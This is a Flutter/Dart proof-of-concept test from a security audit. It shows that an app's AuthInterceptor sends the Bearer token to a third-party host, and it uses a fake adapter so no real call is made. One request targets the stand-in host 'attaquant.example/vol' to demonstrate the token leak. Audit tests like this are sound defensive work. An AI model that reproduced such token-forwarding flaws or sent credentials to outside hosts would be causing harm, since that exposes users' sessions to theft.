// PoC SEC-001 — à lancer avec : flutter test audit/poc/fuite_jeton_poc_test.dart
// Depuis le correctif du 24/11/2026, ce PoC ÉCHOUE : c'est le résultat
// attendu. La non-régression est dans test/securite_test.dart.
// Montre que AuthInterceptor ajoute le jeton Bearer à une URL absolue d'un
// AUTRE hôte que l'API. Aucun appel réseau réel : adaptateur factice.
import 'package:dio/dio.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:pgde_app/core/network/auth_interceptor.dart';
import 'package:pgde_app/core/session/session_expiry.dart';
import 'package:pgde_app/core/storage/token_store.dart';

class _Capture implements HttpClientAdapter {
  RequestOptions? vue;
  @override
  Future<ResponseBody> fetch(RequestOptions o, Stream<List<int>>? s, Future<void>? c) async {
    vue = o;
    return ResponseBody.fromString('', 200);
  }
  @override
  void close({bool force = false}) {}
}

class _Stockage extends Fake implements FlutterSecureStorage {
  @override
  Future<String?> read({required String key, AppleOptions? iOptions, AndroidOptions? aOptions,
      LinuxOptions? lOptions, WebOptions? webOptions, AppleOptions? mOptions, WindowsOptions? wOptions}) async =>
      '15|jeton-secret';
}

void main() {
  test('PoC : le jeton part vers un hôte tiers', () async {
    final _Capture capture = _Capture();
    final Dio dio = Dio(BaseOptions(baseUrl: 'https://emploi.fonctionpublique.sn/api/v1'))
      ..httpClientAdapter = capture
      ..interceptors.add(AuthInterceptor(tokens: TokenStore(_Stockage()), expiry: SessionExpiry()));
    // Une `file_url` contrôlée par un tiers (réponse altérée, donnée injectée…)
    await dio.get<dynamic>('https://attaquant.example/vol');
    expect(capture.vue!.uri.host, 'attaquant.example');
    expect(capture.vue!.headers['Authorization'], 'Bearer 15|jeton-secret');
  });
}
